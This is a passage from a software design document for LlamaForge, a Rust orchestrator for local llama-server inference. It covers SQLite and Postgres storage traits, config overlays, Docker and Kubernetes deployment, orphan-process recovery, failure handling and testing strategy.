    /// Example key: "servers.codellama-7b.priority_class"
    async fn get_all_overlays(&self) -> Result<HashMap<String, serde_json::Value>, StoreError>;

    /// Set a single runtime override. `None` value deletes the key.
    async fn set_overlay(
        &self,
        key: &str,
        value: Option<serde_json::Value>,
    ) -> Result<(), StoreError>;

    /// Atomic batch: apply multiple overlay changes in one transaction.
    async fn set_overlays_batch(
        &self,
        changes: &[(String, Option<serde_json::Value>)],
    ) -> Result<(), StoreError>;

    /// Return all overlays whose key starts with `prefix`.
    async fn get_overlays_by_prefix(
        &self,
        prefix: &str,
    ) -> Result<HashMap<String, serde_json::Value>, StoreError>;
}
```

**Why two traits instead of one:** MetricsStore is append-heavy and write-hot (event batching, process tracking); ConfigOverlayStore is read-heavy and write-cold (occasional admin changes via management API). Splitting them allows independent backend choices — e.g., SQLite for config overlays (simple, local) and Postgres for metrics (shared across nodes) in a hybrid multi-node deployment.

**Why `StoreError` is `Box<dyn Error>` instead of a concrete enum:** A concrete `StoreError` enum with variants for every backend (e.g., `Sqlite(rusqlite::Error)`, `Postgres(sqlx::Error)`) forces the core crate to depend on all backend crates. Boxed trait objects keep the dependency graph clean: the core crate depends only on `std::error::Error`, and each backend crate provides its own `impl From<BackendError> for Box<dyn Error>`.

### 13.2 SQLite Implementation (Default)

The default SQLite backend uses a **split architecture**: the dedicated writer thread (Section 5.6) handles all mutations, while the `deadpool-sqlite` read pool serves queries. This split exists because SQLite's WAL mode allows concurrent readers but only one writer — serializing all writes through a single `std::thread` eliminates write-write lock contention and avoids the risk of `SQLITE_BUSY` errors from concurrent `interact()` write closures.

> **Why not `deadpool-sqlite` for writes?** `deadpool-sqlite` + `interact()` can run synchronous rusqlite calls off the Tokio runtime (each `interact()` closure executes on a pooled `std::thread`). However, using it for writes creates two problems: (1) multiple concurrent `interact()` write closures compete for SQLite's single-writer lock, producing `SQLITE_BUSY` errors that require retry logic in every write path; (2) WAL checkpoint coordination requires knowledge of all in-flight writes, which is trivial with a single writer thread but requires cross-thread synchronization with a pool. The dedicated writer thread eliminates both issues by serializing all mutations through a single `rusqlite::Connection`.

```rust
pub struct SqliteMetricsStore {
    /// Write path: sends batches to the dedicated writer thread (Section 5.6).
    /// The writer thread owns the single write connection and drains this channel.
    writer_tx: tokio::sync::mpsc::Sender<WriterCommand>,
    /// Read path: deadpool-sqlite connection pool for concurrent HTTP queries.
    /// Web UI, management API, and Prometheus metric queries use this pool.
    read_pool: deadpool_sqlite::Pool,
}

/// Commands sent to the dedicated writer thread via the mpsc channel.
enum WriterCommand {
    InsertEvents {
        events: Vec<AuditEvent>,
        /// Oneshot channel to signal completion back to the async caller.
        done: tokio::sync::oneshot::Sender<Result<(), StoreError>>,
    },
    UpsertProcess { proc: ManagedProcess, done: tokio::sync::oneshot::Sender<Result<(), StoreError>> },
    RemoveProcess { pid: u32, done: tokio::sync::oneshot::Sender<Result<(), StoreError>> },
    PruneEvents { cutoff: chrono::DateTime<chrono::Utc>, done: tokio::sync::oneshot::Sender<Result<u64, StoreError>> },
    // ... WAL checkpoint, schema migration, etc.
}

#[async_trait::async_trait]
impl MetricsStore for SqliteMetricsStore {
    async fn insert_events(&self, events: &[AuditEvent]) -> Result<(), StoreError> {
        // Bridge async → sync: send to writer thread, await completion via oneshot.
        let (done_tx, done_rx) = tokio::sync::oneshot::channel();
        self.writer_tx.send(WriterCommand::InsertEvents {
            events: events.to_vec(),
            done: done_tx,
        }).await.map_err(|_| "writer thread dead" as &str)?;
        done_rx.await.map_err(|_| "writer thread dropped response")?
    }

    async fn query_events(
        &self, filter: &EventFilter, limit: u32, offset: u32,
    ) -> Result<Vec<AuditEvent>, StoreError> {
        // Reads go through the deadpool read pool — no writer thread involvement.
        let filter = filter.clone();
        self.read_pool.get().await?.interact(move |conn| {
            // ... build query from filter, execute, collect rows ...
            Ok(Vec::new()) // placeholder
        }).await?.map_err(|e| Box::new(e) as StoreError)
    }

    async fn estimated_size_bytes(&self) -> Result<u64, StoreError> {
        // Read-only — uses the read pool.
        self.read_pool.get().await?.interact(|conn| {
            let page_count: u64 = conn.pragma_query_value(None, "page_count", |r| r.get(0))?;
            let page_size: u64 = conn.pragma_query_value(None, "page_size", |r| r.get(0))?;
            Ok(page_count * page_size)
        }).await?.map_err(|e| Box::new(e) as StoreError)
    }

    // ... remaining write methods bridge through writer_tx;
    //     remaining read methods use read_pool.interact() ...
}
```

> **Async trait ↔ writer thread bridge:** The `WriterCommand` enum + oneshot pattern is the key design element. When the batch collector (Section 13.4) calls `MetricsStore::insert_events()`, the `SqliteMetricsStore` implementation sends a `WriterCommand::InsertEvents` to the writer thread's mpsc channel and awaits the oneshot response. The writer thread receives the command, executes the batch insert on its owned `rusqlite::Connection`, and sends the result back via the oneshot. This preserves the async trait interface for backend pluggability (a `PgMetricsStore` calls `sqlx` directly — no writer thread needed) while maintaining the writer thread's serialization guarantees for SQLite.
>
> **Relationship to Section 5.6 channels:** The two-channel model in Section 5.6 (telemetry channel + audit channel) is an **optimization within the batch collector**, NOT an alternative to the `MetricsStore` trait. The batch collector drains both channels, accumulates events in its ring buffer, and periodically calls `MetricsStore::insert_events(&batch)`. For SQLite, this call bridges to the writer thread. For Postgres, it calls `sqlx` directly. The batch collector does not know or care which backend is active — it only sees the trait interface.
```

```rust
pub struct SqliteConfigOverlayStore {
    pool: deadpool_sqlite::Pool,
}

#[async_trait::async_trait]
impl ConfigOverlayStore for SqliteConfigOverlayStore {
    async fn get_all_overlays(&self) -> Result<HashMap<String, serde_json::Value>, StoreError> {
        self.pool.get().await?.interact(|conn| {
            let mut stmt = conn.prepare("SELECT key, value_json FROM config_overlays")?;
            let rows = stmt.query_map([], |row| {
                Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
            })?;
            let mut map = HashMap::new();
            for row in rows {
                let (k, v) = row?;
                map.insert(k, serde_json::from_str(&v)?);
            }
            Ok(map)
        }).await?.map_err(|e| Box::new(e) as StoreError)
    }

    async fn set_overlay(
        &self,
        key: &str,
        value: Option<serde_json::Value>,
    ) -> Result<(), StoreError> {
        let key = key.to_string();
        let value = value;
        self.pool.get().await?.interact(move |conn| {
            match value {
                Some(v) => {
                    conn.execute(
                        "INSERT INTO config_overlays (key, value_json, updated_at)
                         VALUES (?1, ?2, datetime('now'))
                         ON CONFLICT(key) DO UPDATE SET value_json = ?2, updated_at = datetime('now')",
                        rusqlite::params![key, serde_json::to_string(&v)?],
                    )?;
                }
                None => {
                    conn.execute("DELETE FROM config_overlays WHERE key = ?1", rusqlite::params![key])?;
                }
            }
            Ok(())
        }).await?.map_err(|e| Box::new(e) as StoreError)
    }

    // ... set_overlays_batch wraps multiple set_overlay calls in a single transaction ...
    // ... get_overlays_by_prefix uses "WHERE key LIKE ?1 || '%'" ...
}
```

SQLite-specific initialization (WAL mode, busy timeout, schema migrations) lives entirely within the `SqliteMetricsStore::new()` and `SqliteConfigOverlayStore::new()` constructors — not in the orchestrator core.

### 13.3 Config Overlay Semantics

With the ConfigOverlayStore trait, runtime configuration follows a **two-layer merge** model:

1. **Base layer:** The TOML file (`llamaforge.toml`) is parsed at startup into `Config` structs. Under the overlay model, the TOML file becomes **immutable at runtime** — LlamaForge does not write back to it. The TOML file remains the source of truth for static, deployment-time configuration.
2. **Overlay layer:** Runtime changes (via management API or Web UI) are persisted to the ConfigOverlayStore. On each config read, the orchestrator merges base + overlay, with overlay values taking precedence.

```rust
fn effective_config(base: &Config, overlays: &HashMap<String, serde_json::Value>) -> Config {
    let mut merged = base.clone();
    for (dotted_key, value) in overlays {
        // Apply each overlay to the corresponding field in the Config struct.
        // Uses a generated match table or serde-based path resolution.
        apply_overlay(&mut merged, dotted_key, value);
    }
    merged
}
```

**Why this supersedes TOML writeback (v1.1+):** The TOML writeback approach (Section 5.5) has known limitations: filesystem permission fragility on read-only mounts, loss of comments and formatting on round-trip serialization, and no transactional semantics across multiple keys. The overlay model eliminates all three: the TOML file is never modified, changes are atomic (SQLite transactions or Postgres transactions), and the overlay store is a structured key-value map with no formatting concerns.

> **v1 → v1.1 migration timeline:**
>
> | Version | Config mutation mechanism | TOML writeback | Overlay store |
> |---------|--------------------------|----------------|---------------|
> | **v1.0** (current) | TOML writeback (Section 5.5) | Active — `O_TRUNC` + `write_all()` + `fsync()` via `spawn_blocking` | Not yet integrated |
> | **v1.1** (target) | ConfigOverlayStore | Removed | Active — runtime changes persisted to SQLite `config_overlays` table |
>
> In v1.0, the writeback protocol documented in Section 5.5 is the authoritative implementation. The overlay store traits (Section 13.1) and SQLite implementation (Section 13.2) are the target architecture. Implementers should build the writeback protocol first, then port the management API endpoints to `ConfigOverlayStore::set_overlay()` in a subsequent release. The two mechanisms MUST NOT coexist at runtime — a compile-time feature flag (`feature = "config-overlay"`, off by default in v1.0) gates the switch.

### 13.4 Event Batching Architecture

The audit event pipeline uses an in-memory ring buffer in the orchestrator layer, **outside** the storage trait boundary. The authoritative batching parameters are defined in Section 5.6; this diagram summarizes the architecture:

```
Completion handlers ──► tokio::mpsc (audit + telemetry channels, Section 5.6)
                                    │
                        ┌───────────▼───────────┐
                        │   Batch Collector      │
                        │   (ring buffer, 10000) │
                        │   flush every 100ms or │
                        │   when 100 events      │
                        │   accumulated          │
                        └───────────┬────────────┘
                                    │
                                    ▼
                    MetricsStore::insert_events(&batch)   ◄── async trait boundary
                                    │
                    ┌───────────────┼───────────────┐
                    ▼                               ▼
          SqliteMetricsStore                PgMetricsStore
          (bridges to writer                (calls sqlx
           thread via                       directly —
           WriterCommand +                  natively async)
           oneshot response)
                    │
                    ▼
          Dedicated std::thread
          (owns rusqlite::Connection,
           executes batch INSERT,
           manages WAL checkpoints)
```

The batch collector runs as a `tokio::spawn` background task. It drains both the audit and telemetry mpsc channels (Section 5.6), accumulates events in the ring buffer, and flushes through the `MetricsStore` trait interface. The high-frequency flush (100ms / 100 events) minimizes data loss on crash while keeping per-insert amortization effective. This design means the `MetricsStore` trait only needs to handle bulk inserts — it does not need to implement its own batching logic. For SQLite, the trait implementation bridges to the writer thread; for Postgres, it calls `sqlx` directly. A Postgres implementation benefits equally from batch `INSERT` via `sqlx::query` with `UNNEST` arrays, without duplicating the batching coordination.

### 13.5 Path to Postgres (v2 Multi-Node)

A Postgres implementation of both traits is straightforward because the trait surface avoids SQLite-isms:

```rust
pub struct PgMetricsStore {
    pool: sqlx::PgPool,
}

#[async_trait::async_trait]
impl MetricsStore for PgMetricsStore {
    async fn insert_events(&self, events: &[AuditEvent]) -> Result<(), StoreError> {
        // No interact() — sqlx queries are natively async.
        let mut tx = self.pool.begin().await?;
        for event in events {
            sqlx::query(
                "INSERT INTO audit_events (request_id, timestamp, ...) VALUES ($1, $2, ...)"
            )
            .bind(&event.request_id)
            .bind(&event.timestamp)
            .execute(&mut *tx)
            .await?;
        }
        tx.commit().await?;
        Ok(())
    }

    async fn estimated_size_bytes(&self) -> Result<u64, StoreError> {
        let row: (i64,) = sqlx::query_as(
            "SELECT pg_total_relation_size('audit_events')"
        ).fetch_one(&self.pool).await?;
        Ok(row.0 as u64)
    }
    // ...
}
```

**When Postgres becomes compelling:** Single-node LlamaForge has no reason to take on a Postgres dependency — SQLite is faster for local access, requires zero ops, and ships in the binary. Postgres becomes the right choice when:

- **Multi-node v2:** Multiple LlamaForge instances need shared visibility into audit events and config overlays. SQLite cannot serve concurrent writers across network boundaries.
- **Retention scale:** If audit event volume exceeds SQLite's practical single-file size (hundreds of GB), Postgres offers tablespace management, partitioning, and vacuuming that SQLite lacks.
- **Integration:** Organizations that already run Postgres for other services may prefer a single database for operational data.

### 13.6 Rejected Alternatives

**Single `DataStore` trait combining both concerns.** Rejected because metrics and config have opposite access patterns (write-hot vs read-heavy) and different consistency requirements (eventual vs strong). A single trait forces implementors to handle both in one struct, making it impossible to mix backends (e.g., SQLite config + Postgres metrics in a hybrid deployment).

**Generic `<DB: Database>` type parameter threaded through all components.** Rejected because it infects every struct and function signature in the codebase with a generic parameter, making the code harder to read and preventing type-erased storage in `AppState`. Trait objects (`Arc<dyn MetricsStore>`) provide the same extensibility with better ergonomics. The virtual dispatch overhead (one pointer indirection per call) is negligible compared to the I/O cost of any database operation.

**Feature-flag–gated backends (`#[cfg(feature = "postgres")]`).** This is the *distribution* mechanism, not a *design* alternative — it complements the trait approach. The traits define the interface; Cargo features control which implementations are compiled into the binary. v1 ships with only `feature = "sqlite"` (default, always on). A future `feature = "postgres"` adds `PgMetricsStore` and `PgConfigOverlayStore` without touching the orchestrator core.

---

## 14. Deployment Architecture

### Single Machine (v1 Target)

```
┌─────────────────────────────────────────────────┐
│                  Single Host                     │
│                                                  │
│  ┌────────────────────────────────────────────┐  │
│  │          LlamaForge (single binary)         │  │
│  │          gRPC :50051  ·  HTTP :8000          │  │
│  └──────────────┬─────────────────────────────┘  │
│                 │                                 │
│    ┌────────────┼────────────┐                   │
│    ▼            ▼            ▼                   │
│  ┌──────┐  ┌──────┐  ┌──────┐                   │
│  │llama │  │llama │  │llama │                    │
│  │:8081 │  │:8082 │  │:8083 │                    │
│  │GPU 0 │  │GPU 1 │  │GPU 0 │                    │
│  │8B    │  │34B   │  │8B    │                    │
│  └──────┘  └──────┘  └──────┘                   │
│                                                  │
│  ┌────────────────────────────────────────────┐  │
│  │  SQLite DB: ./llamaforge.db                 │  │
│  └────────────────────────────────────────────┘  │
│                                                  │
│  ┌────────────────────────────────────────────┐  │
│  │  (Optional) Prometheus :9090 + Grafana :3000│  │
│  └────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

### Docker Compose

```yaml
version: "3.8"

services:
  llamaforge:
    image: llamaforge:latest
    init: true  # Use tini as PID 1 — see "Container PID 1 & Signal Handling" below
    ports:
      - "50051:50051"  # gRPC (primary API)
      - "8000:8000"    # HTTP (OpenAI shim + management + Web UI)
    volumes:
      - ./config:/etc/llamaforge
      - ./data:/data
      - /models:/models:ro
    environment:
      LLAMAFORGE_LOG_LEVEL: info
    # GPU access: requires nvidia-container-toolkit installed on the host.
    # See https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html
    deploy:
      resources:
        reservations:
          devices:
            - driver: nvidia
              count: all
              capabilities: [gpu]
    # No dependency on Prometheus — metrics export is no-op if nothing scrapes

  # llama-server instances are managed by LlamaForge as child processes,
  # NOT as separate containers in v1. This keeps latency minimal.

  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    volumes:
      - ./grafana/provisioning:/etc/grafana/provisioning
    environment:
      GF_SECURITY_ADMIN_PASSWORD: admin
```

**Orchestrator Shutdown Timeout Alignment:**

> **Critical:** LlamaForge's `shutdown_drain_timeout_secs` defaults to `max(60, min(ctx_size / 30, 600))` — up to **600 seconds** (10 minutes) for large-context models. This exceeds the default shutdown grace periods of all common orchestrators: Kubernetes `terminationGracePeriodSeconds` defaults to 30s, systemd `TimeoutStopSec` defaults to 90s. If the orchestrator's grace period expires before the drain completes, the process receives SIGKILL, corrupting any in-flight SQLite WAL writes, leaving orphaned `llama-server` processes (no SIGTERM forwarded), and producing truncated client responses.
>
> **Kubernetes:** Set `terminationGracePeriodSeconds` to at least `shutdown_drain_timeout_secs + 30` (the +30 accounts for Steps 5-6 SIGTERM/SIGKILL of child processes):
> ```yaml
> spec:
>   terminationGracePeriodSeconds: 630  # 600 (max drain) + 30 (child cleanup)
> ```
>
> **systemd:** Set `TimeoutStopSec` in the unit file:
> ```ini
> [Service]
> TimeoutStopSec=630
> ```
>
> **Docker Compose:** Set `stop_grace_period`:
> ```yaml
> services:
>   llamaforge:
>     stop_grace_period: 630s
> ```
>
> Alternatively, operators who prefer fail-safe defaults can set `shutdown_drain_timeout_secs = 25` in the server TOML, which fits within all orchestrator defaults without configuration changes. The tradeoff is that long-running generation requests (>25s) will be forcefully aborted on shutdown.

**Container PID 1 & Signal Handling:**

LlamaForge spawns `llama-server` child processes, which means proper signal propagation and zombie reaping are critical in containerized deployments. Two approaches are supported:

1. **Recommended: Use `tini` as init process.** The `init: true` directive in Docker Compose (or `--init` on `docker run`) injects `tini` as PID 1. Tini forwards SIGTERM/SIGINT to the LlamaForge process and reaps zombie child processes. The Dockerfile should include tini:

   ```dockerfile
   FROM debian:bookworm-slim AS runtime
   RUN apt-get update && apt-get install -y --no-install-recommends tini && rm -rf /var/lib/apt/lists/*
   COPY --from=builder /app/llamaforge /usr/local/bin/llamaforge
   ENTRYPOINT ["tini", "--"]
   CMD ["llamaforge", "--config", "/etc/llamaforge/config.toml"]
   ```

2. **Alternative: Built-in signal handler.** LlamaForge implements a SIGTERM/SIGINT handler (via `tokio::signal`) that performs graceful shutdown of all child processes:
   - On SIGTERM/SIGINT: stop accepting new requests, drain active requests (up to `shutdown_timeout_secs`, default 30), send SIGTERM to all child `llama-server` processes, wait 10s, then SIGKILL any survivors.
   - This works when LlamaForge runs as PID 1, but `tini` is still preferred because it handles zombie reaping for any grandchild processes that may be orphaned.

**Orphan Process Recovery:**

All child `llama-server` processes are spawned with the environment variable `LLAMAFORGE_MANAGED=1`. On spawn, the Server Manager records each child's PID and start time (epoch seconds) in a `managed_processes` SQLite table. On startup, LlamaForge performs a four-step orphan recovery procedure:

1. **PID liveness check:** For each PID in the `managed_processes` table, check if the process is still alive (`kill(pid, 0)` on Unix) **and** verify the process name matches `llama-server` (via `/proc/{pid}/comm` on Linux or `sysctl` on macOS). A stale PID that now belongs to a different process is removed from the table.
2. **Health check:** For each surviving `llama-server` process, attempt an HTTP health check on the recorded port (`GET /health` with a 2-second timeout).
3. **Reclaim or kill:** If the health check succeeds and the process's port/model config matches a configured server, the process is reclaimed — the Server Manager first issues `POST /slots/{id}?action=erase` to all active slots (clearing any ghost generations from the previous LlamaForge instance), waits for confirmation, then adopts the process and transitions it to `Running` state, skipping the spawn sequence. This ensures no slots remain occupied by dead requests that would starve the queue on startup. If the health check fails or the config does not match any configured server, the process is killed with SIGTERM (SIGKILL after 10 seconds if it does not exit).
4. **Cleanup:** Stale entries in the `managed_processes` table (PIDs that are no longer alive) are removed.

The `LLAMAFORGE_MANAGED=1` environment variable serves as a safety guard: LlamaForge will never kill a `llama-server` process that was not spawned by a LlamaForge instance.

---

## 15. Multi-Node Evolution Path

The architecture is designed to evolve from single-machine to multi-node without rewriting core components.

### Phase 1: Single Machine (Current Design)
- LlamaForge manages local `llama-server` processes.
- All communication is localhost.
- SQLite for storage.

### Phase 2: Multi-Machine with Central Coordinator
- LlamaForge runs on a coordinator node.
- `llama-server` instances run on worker nodes.
- Communication changes from `localhost:PORT` to `worker-host:PORT`.
- **Change required:** Each worker runs a lightweight LlamaForge agent that the coordinator orchestrates via gRPC — the same `ServerMgmtService` proto is reused between coordinator and worker agents, making this a natural extension of the existing interface.
- SQLite replaced with PostgreSQL for concurrent access from multiple coordinators.

### Phase 3: Fully Distributed
- Multiple LlamaForge coordinators behind a load balancer.
- Shared state in PostgreSQL + Redis (for queue).
- Service discovery via DNS or etcd.
- Queue moves from in-process heap to Redis sorted sets.

**What stays the same across all phases:** API surface, request lifecycle, priority/eviction logic, metrics schema, config format.

**Abstraction boundary:** The `ServerManager` trait:

```rust
#[async_trait]
pub trait ServerManager: Send + Sync {
    async fn start_server(&self, config: &ServerConfig) -> Result<()>;
    async fn stop_server(&self, server_id: &str) -> Result<()>;
    async fn health_check(&self, server_id: &str) -> Result<HealthStatus>;
    async fn get_slots(&self, server_id: &str) -> Result<Vec<SlotStatus>>;
    async fn get_metrics(&self, server_id: &str) -> Result<ServerMetrics>;
}

// v1: LocalServerManager (tokio::process)
// v2: RemoteServerManager (gRPC to worker agents)
// v3: KubernetesServerManager (k8s API)
```

---

## 16. Security Model

### v1 Scope

- **gRPC authentication:** API key validated via `authorization` metadata on every gRPC call (tonic interceptor). Same key works for HTTP `Authorization: Bearer <key>` header.
- **gRPC TLS:** tonic natively supports TLS with certificate files. Enable via config for production deployments. Unlike HTTP-only setups, no reverse proxy needed for encrypted gRPC.
- **Bind address control:** Default to `127.0.0.1` (localhost only) for both gRPC (:50051) and HTTP (:8000) ports. Operator must explicitly set `0.0.0.0` to expose.
- **Management API isolation:** The HTTP `/api/*` management surface and gRPC `ServerMgmtService` can be restricted to a separate bind address or require a different API key.
- **Process isolation:** llama-server processes inherit LlamaForge's UID. No privilege escalation. Consider running as a dedicated non-root user.
- **Config file permissions:** The config file contains the API key and should be `chmod 600`.

### Future (v2+)

- JWT-based authentication with requestor identity extraction.
- Per-requestor rate limits and quotas.
- RBAC: admin (manage servers), operator (manage queue), user (inference only).
- Audit log tamper protection (signed event chain).

---

## 17. Failure Modes & Recovery

| Failure | Detection | Recovery | Client Sees |
|---------|-----------|----------|-------------|
| **llama-server crashes** | Health check fails 3× | Auto-restart with backoff. Queued requests (no active HTTP connection) re-queued to other servers. Dispatched requests (prefilling or generating — any request with an active HTTP connection) aborted with `FINISH_REASON_UPSTREAM_FAILURE`. | All dispatched requests: gRPC `UNAVAILABLE` / SSE `{"error": "backend_crashed", "request_id": "..."}` / HTTP 503. Queued requests: transparent re-route. |
| **llama-server OOM** | Process exits with signal 9 | Restart with reduced `ctx_size` or `parallel_slots` (if auto-tune enabled). Alert operator. | Same as crash — `UNAVAILABLE` with error detail. Request is NOT automatically retried (may OOM again). |
| **GPU error (CUDA/Metal)** | Health check or process exit | Restart. If persistent, mark server as Failed, alert operator. | `UNAVAILABLE` with `{"error": "gpu_error"}`. If other servers serve the same model, request is re-routed transparently. |
| **LlamaForge crash** | Systemd/Docker restart policy | On startup, run four-step orphan recovery (see Orphan Process Recovery in Section 14): check PID liveness + process name from SQLite `managed_processes` table, health check surviving processes, reclaim healthy or kill unhealthy. | Connection drops. Client retries hit the restarted instance. No automatic replay of in-flight requests — clients must re-submit. |
| **SQLite corruption** | Write failure | Switch to fallback mode: metrics to stdout only. Alert operator. Auto-detect via `PRAGMA integrity_check`. If corruption detected, attempt recovery by removing WAL/SHM files (if WAL-only corruption) or creating a fresh database (accepting metrics data loss). Remain in fallback mode (metrics to stdout) until recovery is confirmed by a passing `PRAGMA integrity_check`. | No visible impact — inference continues. Metrics may be incomplete. |
| **Queue overflow** | Queue depth > max | Return 429 with `Retry-After`. Log backpressure event. | gRPC `RESOURCE_EXHAUSTED` with `retry_after` metadata. HTTP 429 with `Retry-After` header. |
| **Network partition (v2+)** | gRPC timeout to worker | Mark servers on unreachable worker as Unknown. Stop routing. Queued requests re-routed; dispatched requests aborted with `FINISH_REASON_UPSTREAM_FAILURE`. | Dispatched requests: `UNAVAILABLE` with `{"error": "network_partition"}`. Queued requests: transparent re-routing if another server serves the model. |
| **Slow llama-server** | TTFT exceeds 5× P95 | Log anomaly. If persistent across multiple requests, consider restart. | No interruption — request completes slowly. Metrics will reflect the anomaly. |
| **Model file corruption** | llama-server fails to load | Mark server as Failed with clear error message. Do not auto-restart (would fail again). | If no other server serves the model: gRPC `NOT_FOUND` / HTTP 404 with `{"error": "model_unavailable"}`. |
| **Request timeout** | Queue wait exceeds deadline | Remove from queue, log timeout event. | gRPC `DEADLINE_EXCEEDED`. HTTP 408. Body: `{"error": "queue_timeout", "waited_secs": 305}`. |

### LlamaForge Self-Health Endpoints

| Endpoint | Protocol | Semantics |
|----------|----------|-----------|
| `GET /health` | HTTP | Returns 200 if the LlamaForge process is alive and can accept connections. Always responds, even if no backends are running. Used by container liveness probes. |
| `GET /ready` | HTTP | Returns 200 if the **API gateway** is ready to accept and queue requests, **with a circuit breaker for total cluster failure**. **Implementation must be lock-free** — `/ready` is called every 5-10 seconds by Kubernetes, load balancers, and monitoring systems. It must never block on mutexes, database queries, or channel operations. The readiness state is derived from two `AtomicU8` values read with `Ordering::Acquire`: (a) `gateway_initialized` (`0`/`1`) — set once during startup after initialization gates pass (gRPC/HTTP listeners bound, queue `Mutex` initialized, SQLite WAL confirmed), cleared on shutdown; (b) `cluster_state` — an enum (`0` = some_starting, `1` = some_running, `2` = all_failed). The `/ready` handler returns **200** if `gateway_initialized == 1` AND `cluster_state != all_failed`. It returns **503** with `{"status": "cluster_failed", "failed_servers": N}` if `cluster_state == all_failed`. The `cluster_state` atomic is updated by the Server Manager's health check loop whenever a server transitions state. **This deliberately does NOT require a running backend during normal startup.** During a rolling deployment, 0-to-1 scale-up, or model loading (which can take 5+ minutes for 70B models), `cluster_state` is `some_starting`, so `/ready` returns 200 — the API gateway remains in the Kubernetes Service endpoint list to accept and queue traffic. Clients submitting requests during loading receive queue position updates while waiting for the backend to become available. **However, if ALL configured servers have permanently failed** (e.g., bad model paths, corrupted GGUF files, persistent GPU errors) — `active_servers == 0` AND `failed_servers > 0` AND `starting_servers == 0` — the circuit breaker trips: `/ready` returns 503, Kubernetes removes the pod from the Service, and traffic shifts to a healthy LlamaForge replica. Without this circuit breaker, the gateway silently queues requests that will never be served, consuming client timeout budgets and masking a permanent backend failure. The circuit breaker auto-resets when any server transitions back to `Starting` or `Running` (e.g., after operator intervention fixes the model path). |
| `GET /ready/inference` | HTTP | Returns 200 only if at least one backend server is in `Running` state and has passed HTTP health checks. Returns 503 otherwise. Use this for stricter readiness checks when the caller requires immediate inference capability (e.g., a load balancer that should only route to pods that can serve without queuing). In Kubernetes, this can be used as a secondary readiness probe for inference-only Services. |
| `grpc.health.v1.Health/Check` | gRPC | Standard gRPC health check protocol. Returns `SERVING` when ready, `NOT_SERVING` otherwise. Supports per-service health (e.g., check only `InferenceService`). |

**Graceful Degradation Priorities:**

1. Never lose a request silently. Every request either completes, is explicitly cancelled, or times out with a logged event.
2. Never corrupt the audit trail. SQLite WAL mode + periodic checkpoints.
3. Prefer re-queuing over dropping. Evicted and failed requests go back to the queue unless the client has disconnected.

---

## 18. Testing Strategy

Testing is an architectural concern for a system with this many interacting components. The strategy is organized by test tier.

### 18.1 Unit Tests

**Priority queue and scheduling logic** — The highest-value unit test target. The priority queue, starvation boost computation, fair share slot reservation, and queue admission control are pure functions that can be tested exhaustively with property-based testing (`proptest` crate).

Key test cases:

- Priority ordering is stable (ordered by effective_priority within tier, with FIFO as the tiebreaker for equal priorities via `enqueued_at`).
- Starvation boost is logarithmic and capped correctly.
- Fair share reservations hold under adversarial priority distributions.
- Admission control rejects correctly at queue limits and per-requestor limits.
- Queue timeout removes requests at the right time.

**Protobuf translation layer** — Verify round-trip fidelity between OpenAI JSON → internal types → protobuf and back. Particularly critical for multimodal content (image_url encoding), tool calls, and grammar/response_format fields.

**Metrics computation** — Verify TTFT, generation TPS, and goodput calculations against known inputs.

### 18.2 Integration Tests (Mock Backend)

A **mock llama-server** (`mock-llama`) is built as a test utility: a simple HTTP server that returns canned SSE responses with configurable delays, token counts, and error injection. This enables testing the full LlamaForge pipeline without a real model or GPU.

Key scenarios:

- Request flows through queue → dispatch → stream → complete, with correct metrics recorded.
- Multiple concurrent requests across multiple mock backends with round-robin and affinity routing.
- Backend crash mid-stream: verify client receives error event and request metrics are recorded.
- Queue overflow: verify 429/RESOURCE_EXHAUSTED at the limit.
- gRPC deadline propagation: verify timeout when mock backend delays beyond deadline.
- Health check failure and automatic server state transitions.

### 18.3 End-to-End Tests

Run against real `llama-server` instances with a small model (e.g., TinyLlama 1.1B Q4_0). These are slower and require a GPU, so they run in CI on GPU-equipped runners or manually before releases.

Key scenarios:

- Full chat completion (streaming and non-streaming) through both gRPC and HTTP/OpenAI shim.
- Server start → inference → stop → restart cycle.
- Multi-model routing with two servers serving different models.
- KV cache type configuration (q8_0, q4_0) produces valid output.
- Prompt cache affinity: two requests with the same system prompt routed to the same server.
- Full chat completion and tool-use streaming through the Anthropic `/v1/messages` shim. Verify SSE event ordering (`message_start` → `content_block_start` → `content_block_delta` → `content_block_stop` → `message_delta` → `message_stop`), content block lifecycle, stop reason propagation, and `tool_use`/`tool_result` round-trip.

### 18.4 Load and Stress Tests

Use a custom load generator (Rust, using `tonic` client for gRPC and `reqwest` for HTTP) that:

- Generates configurable request rates with mixed task_type distributions.
- Measures P50/P95/P99 TTFT and total latency from the client's perspective.
- Validates that LlamaForge's reported metrics match the client-observed metrics (within tolerance).
- Runs sustained load for 1 hour to detect memory leaks, SQLite WAL growth, and metric drift.

### 18.5 Chaos Tests

Fault injection tests to validate the failure modes table:

- `kill -9` a llama-server process mid-request — verify auto-restart and client error handling.
- Fill the SQLite disk — verify fallback to stdout-only metrics.
- Flood the queue beyond max depth — verify admission control and backpressure.
- Corrupt the config file and trigger reload — verify graceful handling.
- Simulate slow llama-server (mock with 10× normal latency) — verify anomaly detection.

### 18.6 SDK Compatibility Tests

A Python test suite (`tests/sdk_compat/`) exercises the HTTP shim through the **actual OpenAI and Anthropic Python SDKs** (`pip install openai anthropic`) as black-box clients. This catches format compliance issues that pass raw HTTP tests but crash SDK parsers (e.g., `finish_reason` not in the SDK's closed enum, `usage` object missing required fields, SSE `data:` lines with invalid JSON).

Key scenarios:

- Chat completion (streaming + non-streaming) via `openai.ChatCompletion.create()` — verify the SDK returns valid typed `ChatCompletion` / `ChatCompletionChunk` objects without raising `APIError` or `ProtocolError`.
- Tool use round-trip via `openai` SDK — verify `tool_calls` in response parse correctly and `tool` role messages are accepted.
- Embeddings via `openai.Embedding.create()` — verify response shape matches SDK expectations.
- Anthropic Messages API (streaming + non-streaming) via `anthropic.Anthropic().messages.create()` — verify SSE event ordering, content block lifecycle, and `tool_use`/`tool_result` round-trip.
- Error handling: verify SDK-appropriate exceptions are raised for 429, 503, and malformed responses.

These tests run against `mock-llama` (no GPU required) and are the primary regression gate for SDK compatibility. A 20-line pytest file catches 90% of compatibility regressions that raw HTTP tests miss.

### 18.7 Micro-Benchmarks

`criterion` benchmarks (`benches/`) for internal data structure operations, run in CI on every PR:

